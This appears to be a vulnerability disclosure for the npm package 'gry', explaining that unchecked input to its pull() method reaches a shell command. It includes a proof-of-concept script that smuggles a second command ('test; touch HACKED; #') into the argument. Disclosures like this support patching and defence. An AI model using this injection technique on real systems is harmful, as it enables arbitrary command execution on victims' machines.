
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check.

## Proof of Concept (Credit: [Mik317](https://huntr.dev/app/users/Mik317))
1. Create the following PoC file:
```js
// poc.js
const Repo = require("gry");
var myRepo = new Repo(".");
myRepo.pull('test; touch HACKED; #', function(){console.log('Finished!')})
```
2. Check there aren't files called `HACKED`
3. Execute the following commands in another terminal:
```bash
npm i gry # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
## References:
 - [GitHub Issue](https://github.com/IonicaBizau/node-gry/issues/21)
 - [GitHub Permalink #1](https://github.com/IonicaBizau/node-gry/blob/master/lib/index.js#L149)